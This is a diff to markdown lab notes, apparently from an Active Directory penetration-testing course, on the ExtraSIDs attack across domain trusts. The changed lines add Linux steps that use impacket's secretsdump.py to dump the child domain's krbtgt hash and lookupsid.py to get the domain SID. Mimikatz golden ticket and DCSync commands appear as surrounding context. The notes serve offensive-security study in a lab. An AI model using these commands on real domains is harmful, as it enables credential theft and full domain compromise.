@@ -439,6 +439,7 @@ extraSIDS attack: lets user add an admin account to the SID history attribute of
 >FDQN of child domain (X.INLANEFREIGHT.LOCAL) 
 >
 >SID of Enterprise Admins group of root domain
+### From Windows 
 
 ### **Mimikatz** 
 
@@ -486,13 +487,24 @@ kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:CHILD-D
 ```
 lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
 ```
-## From Linux 
+### From Linux 
+>[!NOTE]
+> KRBTGT hash for child domain
+>
+>SID for child domain
+>
+>Name of target user (can be fake) 
+>
+>FDQN of child domain (X.INLANEFREIGHT.LOCAL) 
+>
+>SID of Enterprise Admins group of root domain
 
 ```
 secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
+```
 
 ```
-lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 
+lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID" 
 ```
 
   
